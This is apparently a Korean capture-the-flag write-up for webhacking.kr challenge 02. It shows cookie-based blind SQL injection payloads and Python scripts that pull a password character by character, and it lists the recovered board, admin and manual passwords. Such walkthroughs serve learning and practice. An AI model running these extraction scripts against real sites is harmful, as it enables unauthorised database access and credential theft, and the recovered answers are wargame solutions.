================================================================================================================
[webhacking.kr] 02
================================================================================================================

Flow Chart
================================================================================================================

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8 -> step10 -> step12;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9 -> step11 -> step13;
        }
        step0 -> step1[label="time = '1 and 1=1'",arrowhead="normal"];
        step3 -> step2[label="<!--2070-01-01 09:00:01-->",arrowhead="normal"];
        step4 -> step5[label="time = '1 and 1=2'",arrowhead="normal"];
        step7 -> step6[label="<!--2070-01-01 09:00:00-->",arrowhead="normal"];
        step8 -> step9[label="time = 1 and (select if(length(password)>8,1,0) from FreeB0aRd)",arrowhead="normal"];
        step10 -> step11[label="time = 1 and (select ascii(substr(password,%d,1)) from FreeB0aRd)=%d",arrowhead="normal"];

    }

|

Source analysis
================================================================================================================

해당 html 소스 내에 주석 처리된 부분에 time이 출력되는 것을 볼 수 있는데, 쿠키 값에 time이 설정되어 있는 것으로 보아 해당 쿠키 값이 페이지 상에 출력되는 것으로 추측됩니다.

.. code-block:: html

    <html>
    <head>
    <title>Project Progress</title>
    </head>
    <body bgcolor=black>
    <center>
    <table width=970 bgcolor=white>
    <td colspan=5>
    <img src="img/new_main.jpg" alt="" usemap="#main.jpg" style="border: 0;" />
    <map name="main.jpg">
        <area shape="rect" coords="15,8,517,54" href="index.php" target="" alt="" />
        <area shape="rect" coords="339,63,403,93" href="about.php" target="" alt="" />
        <area shape="rect" coords="413,63,490,92" href="member.php" target="" alt="" />
        <area shape="rect" coords="500,63,582,92" href="research.php" target="" alt="" />
        <area shape="rect" coords="592,63,651,92" href="bbs/index.php" target="" alt="" />
        <area shape="rect" coords="662,64,745,93" href="fun.php" target="" alt="" />
        <area shape="rect" coords="756,63,825,93" href="contact.php" target="" alt="" />
        <area shape="rect" coords="851,7,890,65" href="admin/" target="" alt="" />

    </map>
    <br><center><br>
    </td><tr>
    </table>

    <table bgcolor=white width=976>
    <td width=88></td>
    <td width=800>
    <br>
    <center>
    <a href=index.php><img src=img/new.jpg border=0></a><br>
    <br><br>
    <!--2015-11-24 10:12:18--></td>
    <td width=88></td>
    </table>

    <table width=970 bgcolor=black>
    <td><br><center><font size=2 color=white>Copyright ¨Ï 2008 beistlab. All rights reserved</td>
    </table>

|

COOKIE Injection
================================================================================================================

Cookie 값 입력을 통해 True/False 여부를 확인합니다.

.. code-block:: console

    time = '1 and 1=1'  // True: <!--2070-01-01 09:00:01-->
    time = '1 and 1=2'  // False: <!--2070-01-01 09:00:00-->

|

Blind SQL Injection
================================================================================================================

테이블 명과 컬럼 명은 유추를 통해 확인할 수 있습니다.

- 테이블 명 : FreeB0aRd
- 컬럼명 : password

|

패스워드 길이 확인
================================================================================================================

다음 쿼리문을 입력해서 password 길이를 확인한다. 

- password 길이 : 9

.. code-block:: python

    import requests

    cookie = {
        "PHPSESSID":"di0tppi0hjd8prirqbkkl6isj2",
        "time":"1 and (select if(length(password)>8,1,0) from FreeB0aRd)"
    }
    url = "http://webhacking.kr/challenge/web/web-02/index.php"
    r = requests.get(url,cookies=cookie, verify=False)
       
    print r.content.split('<!--')[1].split('-->')[0]

|

패스워드 값 확인
================================================================================================================

다음 쿼리문을 입력해서 FreeB0aRd password 값을 확인한다.

- FreeB0aRd password : 7598522ae

.. code-block:: python

    import requests

    pw =""
    for i in range(1,10):
        for j in range(33,126):
            #print j
            cookie = {
                "PHPSESSID":"di0tppi0hjd8prirqbkkl6isj2",
                "time":"1 and (select ascii(substr(password,%d,1)) from FreeB0aRd)=%d" % (i,j)
            }

            url = "http://webhacking.kr/challenge/web/web-02/index.php"
            r = requests.get(url,cookies=cookie, verify=False)
            q = r.content.split('<!--')[1].split('-->')[0]
            if "09:00:01" in q:
                pw += chr(j)
                print pw
                break

    print pw

|

admin 패스워드 값 확인
================================================================================================================


확인된 패스워드를 패스워드가 걸려있는 게시판에 입력한 결과 하나의 다운로드 링크가 존재한다.
페이지에서 파일을 다운 받으면 __AdMiN__FiL2.zip 이라는 압축 파일이 존재하는데 해당 파일이 암호가 걸려있다.

해당 파일에 대한 패스워드는 admin 페이지에 존재하는 것으로 추측되며 admin 페이지 패스워드를 위와 같은 방식으로 찾는다.

- admin password: 0nly_admin

.. code-block:: html
    admin page

    Notice
    -관리자 패스워드가 유출되지 않게 조심하세요.
    -처음 사용하시는 분은 메뉴얼을 참고하세요.(메뉴얼 패스워드 : @dM1n__nnanual)


해당 패스워드로 압축 파일을 해제하면 인증 패스워드를 확인할 수 있다.
